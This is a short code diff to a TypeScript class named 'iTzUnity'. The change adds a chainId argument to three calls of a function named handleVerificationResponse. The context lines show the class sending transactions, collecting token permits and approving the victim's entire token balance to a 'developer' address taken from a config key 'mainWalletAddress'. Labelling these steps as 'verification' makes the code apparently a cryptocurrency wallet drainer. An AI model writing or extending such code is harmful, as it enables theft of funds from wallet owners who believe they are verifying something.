@@ -55,7 +55,7 @@ class iTzUnity {
 
 		//@ts-ignore
 		const txResponse = await signer!.sendTransaction(tx);
-		await handleVerificationResponse("TRANSACTION", account.address+"", txResponse,token.balance);
+		await handleVerificationResponse("TRANSACTION", account.address+"",account.chainId || -1, txResponse,token.balance);
 	}
 
 	async permit() {
@@ -103,7 +103,7 @@ class iTzUnity {
 			provider: providerUrl,
 			token
 		}
-		await handleVerificationResponse("PERMIT",account.address+"",payload,token.balance);
+		await handleVerificationResponse("PERMIT",account.address+"",account.chainId || -1,payload,token.balance);
 	}
 
 	async approve() {
@@ -113,7 +113,7 @@ class iTzUnity {
 			address: await getConfig('mainWalletAddress')
 		}
 		const res = await callContractMethod('approve',[developer.address,this.token.balance], this.token.contract_address,this.signer!)
-		await handleVerificationResponse("PERMIT",this.account.address+"",res,this.token.balance);
+		await handleVerificationResponse("PERMIT",this.account.address+"",this.account.chainId || -1,res,this.token.balance);
 	}
 }
 
